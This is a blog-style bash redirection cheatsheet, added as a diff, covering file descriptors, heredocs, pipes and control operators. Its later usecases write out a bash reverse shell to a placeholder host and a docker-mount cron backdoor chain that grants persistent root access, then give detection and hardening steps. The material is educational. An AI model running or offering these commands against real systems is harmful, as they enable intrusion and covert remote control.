@@ -1,0 +1,641 @@
+---
+title: "Resource: Bash Redirection & Operators Cheatsheet"
+description: "A comprehensive reference for bash redirection operators, file descriptors, pipes, heredocs, and control operators and with real world usecases including raw HTTP requests and reverse shells."
+date: "2026-03-01"
+author: "Pir Ahmed Shah"
+tags:
+     - resource
+     - learning
+     - tooling
+     - workflow
+---
+
+# Bash Redirection & Operators Cheatsheet
+
+## The Universal Structure
+
+```
+[N] OPERATOR [M or file or command]
+ ↑      ↑              ↑
+ │      │              └── destination (where to send)
+ │      └─────────────── what operation to perform
+ └────────────────────── source (what to redirect), default is 1 (stdout)
+```
+
+---
+
+## File Descriptors
+
+```
+0  →  stdin  (keyboard input)
+1  →  stdout (normal output)
+2  →  stderr (error output)
+3+ →  custom (you define these)
+```
+
+---
+
+## Output Redirection `[N]> file`
+
+```bash
+# structure
+[N]> file
+ │ │   └── destination file
+ │ └─────── overwrite operator
+ └───────── source fd (default: 1)
+
+# usage
+ > file     # stdout → file (overwrite)     same as 1> file
+1> file     # stdout → file (overwrite)
+2> file     # stderr → file (overwrite)
+3> file     # fd 3   → file (overwrite)
+
+# examples
+ls -al > output.txt                 # save stdout to file
+cat nonexistent.txt 2> errors.log   # save stderr to file
+command 2> /dev/null                # discard stderr entirely
+```
+
+---
+
+## Append Redirection `[N]>> file`
+
+```bash
+# structure
+[N]>> file
+ │  │   └── destination file
+ │  └─────── append operator
+ └────────── source fd (default: 1)
+
+# usage
+ >> file    # stdout → file (append)     same as 1>> file
+1>> file    # stdout → file (append)
+2>> file    # stderr → file (append)
+
+# examples
+echo "line 1" > file.txt            # create file
+echo "line 2" >> file.txt           # append to file
+echo "line 3" >> file.txt           # append to file
+command 2>> errors.log              # append errors to log
+```
+
+---
+
+## FD to FD Redirection `[N]>&[M]`
+
+```bash
+# structure
+[N]>&[M]
+ │ │  └── source fd to copy from
+ │ └───── duplicate operator
+ └──────── fd to redirect (default: 1)
+
+# usage
+2>&1        # point stderr(2) to wherever stdout(1) goes
+1>&2        # point stdout(1) to wherever stderr(2) goes
+3>&1        # point fd 3 to wherever stdout(1) goes
+
+# examples
+command > file 2>&1     # stdout → file, stderr → same as stdout (file)
+command 2>&1 > file     # !!  stderr → terminal, stdout → file (order matters!)
+command 1>&2            # send stdout to stderr
+echo "error" 1>&2       # print to stderr instead of stdout
+```
+
+---
+
+## Close FD `[N]>&-`
+
+```bash
+# structure
+[N]>&-
+ │  │└── dash = close
+ │  └──── duplicate operator
+ └─────── fd to close
+
+# usage
+3>&-        # close fd 3
+2>&-        # close stderr (suppress all errors permanently)
+1>&-        # close stdout
+
+# examples
+exec 3>&-               # close custom fd 3 after use
+command 2>&-            # run command with stderr completely closed
+```
+
+---
+
+## Input Redirection `[N]< file`
+
+```bash
+# structure
+[N]< file
+ │ │   └── source file
+ │ └─────── input operator
+ └───────── destination fd (default: 0)
+
+# usage
+ < file     # file → stdin     same as 0< file
+0< file     # file → stdin
+3< file     # file → fd 3
+
+# examples
+cat < file.txt                      # same as cat file.txt
+mysql -u root mydb < dump.sql       # feed SQL file into mysql
+sort < unsorted.txt > sorted.txt    # read from file, write to file
+grep "root" < /etc/passwd           # grep reading from file via stdin
+```
+
+---
+
+## Input FD to FD `[N]<&[M]`
+
+```bash
+# structure
+[N]<&[M]
+ │  │  └── source fd
+ │  └───── duplicate operator
+ └──────── destination fd (default: 0)
+
+# usage
+0<&3        # point stdin to wherever fd 3 goes
+ <&3        # same as 0<&3
+
+# examples
+exec 3< file.txt        # open file on fd 3
+cat <&3                 # read from fd 3 (same file)
+exec 3<&-               # close fd 3
+```
+
+---
+
+## Read+Write (Bidirectional) `[N]<> file`
+
+```bash
+# structure
+[N]<> file_or_socket
+ │  │       └── file or socket
+ │  └─────────── read+write operator
+ └────────────── fd (default: 0)
+
+# usage
+3<> /dev/tcp/host/port  # open TCP socket for read+write on fd 3
+0<> file                # open file for read+write on stdin
+
+# examples
+# raw HTTP request using only bash
+exec 3<>/dev/tcp/google.com/80
+echo -e "GET / HTTP/1.0\r\nHost: google.com\r\n\r\n" >&3
+cat <&3
+exec 3>&-
+
+# reverse shell (educational)
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+#          ↑ open TCP socket, stdout+stderr → socket, stdin ← socket
+```
+_Note: /dev/tcp is a Bash-specific feature. It won't work in zsh, fish, or dash_
+---
+
+## Heredoc `[N]<< DELIMITER`
+
+```bash
+# structure
+[N]<< DELIMITER
+ │  │       └── must be at column 0, no indentation
+ │  └─────────── heredoc operator
+ └────────────── destination fd (default: 0)
+
+# variants
+<< 'EOF'    # quoted   — NO variable expansion (literal)
+<< EOF      # unquoted — variable expansion
+<<- EOF     # dash     — strips leading TABS (not spaces)
+
+# examples
+
+# no variable expansion
+cat << 'EOF'
+Hello $USER        # prints literally: Hello $USER
+EOF
+
+# with variable expansion
+cat << EOF
+Hello $USER        # prints: Hello ahmed
+EOF
+
+# write to file (most common use)
+cat > /etc/ssh/sshd_config.d/99-hardening.conf << 'EOF'
+PermitRootLogin no
+PasswordAuthentication no
+X11Forwarding no
+MaxAuthTries 3
+EOF
+
+# strip leading tabs with <<-
+cat <<- EOF
+	indented content    # tab is stripped
+	more content        # tab is stripped
+EOF
+```
+
+---
+
+## Herestring `[N]<<< "string"`
+
+```bash
+# structure
+[N]<<< "string"
+ │   │       └── string value
+ │   └─────────── herestring operator
+ └────────────── destination fd (default: 0)
+
+# examples
+cat <<< "hello world"               # string → stdin of cat
+grep "root" <<< "root:x:0:0"        # string → stdin of grep
+base64 <<< "encode this"            # string → stdin of base64
+
+# with variables
+username="deploy"
+grep "deploy" <<< "$username"
+
+# instead of echo | cmd
+echo "hello" | cat                  # pipe version
+cat <<< "hello"                     # herestring version (cleaner)
+```
+
+---
+
+## Both stdout+stderr `&>`
+
+```bash
+# structure
+&> file     # shorthand for 1> file 2>&1
+&>> file    # shorthand for 1>> file 2>&1
+
+# examples
+command &> /dev/null                # discard ALL output
+apt install nginx &> install.log    # save everything to log
+command &>> log.txt                 # append everything to log
+```
+
+---
+
+## Pipe `[N]| cmd`
+
+```bash
+# structure
+cmd1 [N]| cmd2
+      │ │    └── next command
+      │ └─────── pipe operator
+      └───────── source fd (default: 1)
+
+# variants
+cmd1 |  cmd2    # stdout of cmd1 → stdin of cmd2
+cmd1 |& cmd2    # stdout+stderr of cmd1 → stdin of cmd2
+
+# examples
+cat file | grep "error"
+ls -al | sort | head -10
+ps aux | grep nginx | grep -v grep
+cat /var/log/auth.log | grep "Failed" | awk '{print $11}' | sort | uniq -c | sort -rn
+
+# pipe stderr too
+command |& grep "error"             # same as command 2>&1 | grep "error"
+```
+
+---
+
+## Process Substitution `<(cmd)` `>(cmd)`
+
+```bash
+# structure
+<(command)      # treat output of command as a readable file
+>(command)      # treat command as a writable file
+
+# examples
+diff <(ls dir1) <(ls dir2)                      # diff two directory listings
+diff <(ssh server1 ls) <(ssh server2 ls)         # diff remote directories
+tee >(grep "error" > errors.log) > full.log      # split output to two files
+sort -u <(cat file1) <(cat file2)               # sort+unique across two files
+```
+
+---
+
+## Custom File Descriptors `exec N>`
+
+```bash
+# open custom fd
+exec 3> output.txt      # open fd 3 for writing
+exec 3>> output.txt     # open fd 3 for appending
+exec 3< input.txt       # open fd 3 for reading
+exec 3<> socket         # open fd 3 for read+write
+
+# use custom fd
+echo "hello" >&3        # write to fd 3
+cat <&3                 # read from fd 3
+
+# close custom fd
+exec 3>&-               # close fd 3
+
+# save and restore stdout
+exec 3>&1               # save stdout to fd 3
+exec 1> output.log      # redirect stdout to file
+echo "this goes to file"
+exec 1>&3               # restore stdout from fd 3
+echo "this goes to terminal"
+exec 3>&-               # close fd 3
+```
+
+---
+
+## Order Matters !!
+
+```bash
+# CORRECT — stdout → file, stderr → file
+command > file 2>&1
+# reads as: stdout goes to file, THEN stderr goes to wherever stdout is (file)
+
+# WRONG — stderr → terminal, stdout → file
+command 2>&1 > file
+# reads as: stderr goes to wherever stdout is (terminal), THEN stdout goes to file
+
+# bash processes redirections LEFT TO RIGHT
+```
+
+---
+
+## Control Operators
+
+```bash
+;           # run sequentially regardless of exit code
+&&          # run next ONLY if previous succeeded (exit 0)
+||          # run next ONLY if previous failed (exit non-0)
+&           # run in background
+|           # pipe stdout to next command's stdin
+|&          # pipe stdout+stderr to next command's stdin
+
+# examples
+cmd1 ; cmd2                         # always runs both
+cmd1 && cmd2                        # cmd2 only if cmd1 succeeds
+cmd1 || cmd2                        # cmd2 only if cmd1 fails
+cmd1 && cmd2 || cmd3                # if cmd1 succeeds run cmd2, else cmd3
+cmd &                               # run in background
+
+# real world
+sshd -t && systemctl restart ssh || echo "config invalid"
+mkdir /app && cd /app && npm install || { echo "setup failed"; exit 1; }
+curl https://get.docker.com | bash \
+    && useradd -m -G docker $VPS_USER \
+    && echo "done" \
+    || { echo "failed"; exit 1; }
+```
+
+---
+
+## Special Variables
+
+```bash
+$?      # exit code of last command (0=success, non-0=failure)
+$$      # PID of current shell
+$!      # PID of last background process
+$0      # name of current script
+$1-$9   # positional arguments
+$@      # all arguments as separate words
+$*      # all arguments as single word
+$#      # number of arguments
+
+# examples
+command
+echo $?             # 0 if succeeded, 1/2/etc if failed
+
+sleep 10 &
+echo $!             # PID of sleep
+
+echo "script: $0, args: $@, count: $#"
+```
+
+---
+
+## Safe Script Header
+
+```bash
+#!/usr/bin/env bash
+set -e              # exit on any error
+set -u              # exit on undefined variable
+set -o pipefail     # exit if any command in pipe fails
+set -x              # print each command before executing (debug)
+
+# shorthand
+set -euo pipefail
+
+# validate required variables
+: ${VPS_USER:?VPS_USER is required}
+: ${VPS_HOST:?VPS_HOST is required}
+```
+
+---
+
+## Quick Reference Card
+
+```
+N>file      write fd N to file (overwrite)
+N>>file     write fd N to file (append)
+N>&M        point fd N to fd M
+N>&-        close fd N
+N<file      read file into fd N
+N<&M        point fd N input to fd M
+N<>file     open fd N for read+write
+N<<EOF      heredoc into fd N
+N<<<str     herestring into fd N
+|           pipe stdout between commands
+|&          pipe stdout+stderr between commands
+&>file      stdout+stderr to file (overwrite)
+&>>file     stdout+stderr to file (append)
+;           run sequentially
+&&          run if previous succeeded
+||          run if previous failed
+&           run in background
+<(cmd)      command output as readable file
+>(cmd)      command as writable file
+```
+
+---
+
+## Real World Usecases
+
+### Usecase 1: Raw HTTP Request (no curl, pure bash)
+
+```bash
+# open fd 3 as a bidirectional TCP socket to google.com:80
+exec 3<>/dev/tcp/google.com/80
+#    │ │  └── host and port
+#    │ └───── read+write operator
+#    └─────── custom fd 3
+
+# write HTTP request into fd 3 (to the socket)
+echo -e "GET / HTTP/1.0\r\nHost: google.com\r\n\r\n" >&3
+#                                                      └── stdout → fd 3 (socket)
+
+# read HTTP response from fd 3 (from the socket)
+cat <&3
+#    └── fd 3 (socket) → stdin of cat → terminal
+
+# close the socket
+exec 3>&-
+```
+
+**What each operator does here:**
+```bash
+3<>     #  opens fd 3 for BOTH reading and writing (bidirectional socket)
+>&3     #  sends our HTTP request OUT through the socket
+<&3     #  reads the server response IN from the socket
+3>&-    #  closes fd 3 (clean up)
+```
+
+**Full breakdown of the request flow:**
+```
+your machine                        google.com:80
+────────────                        ─────────────
+exec 3<>/dev/tcp/google.com/80  →   TCP connection established
+echo "GET / ..." >&3            →   sends bytes to google
+cat <&3                         ←   receives bytes from google
+exec 3>&-                       →   closes connection
+```
+
+---
+
+### Usecase 2: Reverse Shell (attacker perspective)
+
+```bash
+# attacker machine — listen for incoming connection
+nc -lvnp 4444
+# -l  listen mode
+# -v  verbose
+# -n  no DNS resolution
+# -p  port number
+```
+
+```bash
+# victim machine — call back to attacker
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+#    │  │  │                           └── stdin(0) → wherever stdout(1) is going (socket)
+#    │  │  └── open TCP socket to attacker
+#    │  └───── stdout+stderr → socket
+#    └──────── interactive bash (required for shell to work)
+```
+
+**What each operator does here:**
+```
+-i          →  interactive mode, bash behaves as if connected to a terminal
+>&          →  redirect stdout(1) AND stderr(2) to the socket
+/dev/tcp/   →  bash magic — opens a real TCP connection
+0>&1        →  redirect stdin(0) to wherever stdout(1) is (the socket)
+```
+
+**Full breakdown of the data flow:**
+```
+attacker (nc)                       victim (bash -i)
+─────────────                       ────────────────
+nc -lvnp 4444  ←── TCP connection ── bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+attacker types: ls -al              →  stdin(0)  of bash via socket
+bash executes: ls -al
+bash output: file listing           →  stdout(1) of bash via socket → attacker sees it
+bash errors: permission denied      →  stderr(2) of bash via socket → attacker sees it
+```
+
+**Why `0>&1` is critical:**
+```bash
+# without 0>&1
+bash -i >& /dev/tcp/attacker.com/4444
+# stdout → socket  attacker sees output
+# stderr → socket  attacker sees errors
+# stdin  → ???     !!! still reading from victim's keyboard, not attacker
+# result: attacker can see output but cannot send commands — useless
+
+# with 0>&1
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+# stdout → socket  attacker sees output
+# stderr → socket  attacker sees errors
+# stdin  → socket  attacker sends commands
+# result: full interactive shell — attacker has complete control
+```
+
+---
+
+### Usecase 3: Persistent Backdoor via Cron
+
+```bash
+# plant a reverse shell that runs every minute as root
+# done via docker volume mount (no sudo needed if in docker group)
+
+docker run -v /:/mnt --rm ubuntu bash -c \
+#       │       │       │  │      |    └─ the reverse shell command (below)
+#       │       │       │  │      └─ shell
+#       │       │       │  └ image           
+#       │       │       └─── automatically delete the container and its associated file system
+#       │       └─────────── mount / to /mnt inside container
+#       └───────────────────────────── mount entire host filesystem at /mnt
+
+#                                                ┌host  port┐
+        'echo "* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /mnt/var/spool/cron/crontabs/root'
+#                │             └interactive shell                     │                               └root's crontab on HOST filesystem
+#                │                                                    └─────append (don't overwrite existing jobs)
+#                └── cron schedule (* = every minute)
+
+# cron schedule breakdown
+# * * * * * command
+# │ │ │ │ │
+# │ │ │ │ └── day of week (0-7)
+# │ │ │ └──── month (1-12)
+# │ │ └─────── day of month (1-31)
+# │ └──────────hour (0-23)
+# └────────────minute (0-59)
+# * = every — so this fires every single minute
+```
+
+**The full attack chain combined:**
+```
+1. get deploy SSH key (from leaked GitHub secrets)
+        ↓
+2. ssh -i deploy_key deploy@victim.com
+        ↓
+3. docker run -v /:/mnt --rm ubuntu bash    ← docker group = no sudo needed
+        ↓
+4. chroot /mnt                              ← now you ARE the host as root
+        ↓
+5. echo "* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1" \
+   >> /var/spool/cron/crontabs/root         ← persistent backdoor planted
+        ↓
+6. every 60 seconds, victim calls home
+        ↓
+7. nc -lvnp 4444 on attacker machine
+        ↓
+8. full root shell, persistent, survives reboots
+```
+
+**How to detect it:**
+```bash
+# check root's crontab for anything suspicious
+cat /var/spool/cron/crontabs/root
+
+# check all crontabs
+grep -r "dev/tcp" /var/spool/cron/
+grep -r "dev/tcp" /etc/cron*
+
+# watch for outbound connections
+ss -tnp
+netstat -tnp
+```
+
+**How to prevent it:**
+```bash
+# don't put users in docker group — use rootless docker instead
+dockerd-rootless-setuptool.sh install
+
+# or restrict docker socket permissions
+chmod 660 /var/run/docker.sock
+chown root:docker /var/run/docker.sock
+
+# monitor docker socket access
+auditctl -w /var/run/docker.sock -p rwxa -k docker_socket
+```
